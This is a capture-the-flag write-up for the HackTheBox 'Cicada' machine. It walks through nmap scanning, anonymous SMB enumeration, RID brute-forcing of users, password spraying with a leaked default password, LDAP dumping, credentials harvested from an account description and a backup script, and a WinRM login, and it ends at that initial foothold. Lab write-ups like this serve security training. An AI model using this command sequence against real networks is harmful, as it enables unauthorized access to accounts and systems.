---
layout: blog
title: Cicada HackTheBox
category: Cicada-HackTheBox
date: 1997-01-23
---
### Service Enumeration

**Port Scan Results**

Server IP Address | Ports Open
------------------|----------------------------------------
192.168.92.110       | **TCP**: 53,88,135,139,389,445,464,593,3268,3269,5985,63935

Ran nmap to scan for common TCP ports open on the target.

```bash
sudo nmap -sC -sV 10.10.11.35 -oA nmap -v 
```
![](<Pasted image 20241011182259.png>)
![](<Pasted image 20241011182323.png>)

Ran another nmap scan to identify any other open TCP ports on the target.
```bash
nmap -sV -p- -v 10.10.11.35 -oA nmap2
```
![](<Pasted image 20241011183159.png>)


**139,445 - SMB Enumeration**

The SMB share allows anonymous login which can be be exploited using the command below:
```bash
smbclient -N -L \\10.10.11.35
```
![](<Pasted image 20241011182605.png>)

Connected to the HR SMB share.
```bash
smbclient -N -L \\10.10.11.35
```
Under HR, found a file "Notice from HR.txt"
```
Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Based on the HR notice above, I added cicada.htb to /etc/hosts file that will resolve cicada.htb to the corresponding IP at 10.10.11.35.
```bash
sudo nano /etc/hosts
```
```
10.10.11.35 cicada.htb
```

Since the machine allows Guest session, I used this to enumerate users and shares on the target system.
```bash
nxc smb 10.10.11.35 -u Guest -p '' --rid-brute > user.txt
```
This will save a list of users on the system in a file named `user.txt`. Discovered all these usernames:
```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
Administrator
Guest
krbtgt
CICADA-DC$
```

Now I am going to use the credential found from the HR notice along with the gathered list of usernames against the target to check for valid credentials.
```
nxc smb 10.10.11.35 -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```
![](<Pasted image 20241012200417.png>)

I have a valid user `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`. Now, that I have valid credentials for a user on the target system, I can use `ldapdomaindump` to gather more details including users, groups, containers, etc.
```bash
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --no-json cicada.htb
```
![](<Pasted image 20241012202346.png>)
Running `ldapdomaindump` generates a `domain_users.html` file that contains interesting information on one of the other users - david.orelious. The user account description for david.orelious says:
```
Just in case I forget my password is aRt$Lp#7t*VQ!3
```
![](<Pasted image 20241012202346-1.png>)

Now that I have another set of credentials, I am going to attempt to access another SMB share folder /DEV as user david.orelious.
```bash
smbclient -U 'cicada.htb/david.orelious' \\\\10.10.11.35\\DEV
```
This share contains `Backup_script.ps1`. Downloaded the script file in local system
```
smb> get Backup_script.ps1
```
![](<Pasted image 20241012202801.png>)
This script contains credentials for another user `emily.oscars:Q!3@Lp#M6b*7t*Vt`. Leveraging the user information gathered from `ldapdomaindump`, I know that the user `emily.oscars` has remote management access and is also a member of backup operators group.
![](<Pasted image 20241012202906.png>)

**Initial Foothold - emily.oscars**

I can now log in as user `emily.oscars` over WinRM. I am going to use [evil-winrm](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm#using-evil-winrm) to get PowerShell access.
```bash
evil-winrm -i 10.10.11.35 -u 'cicada.htb\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```







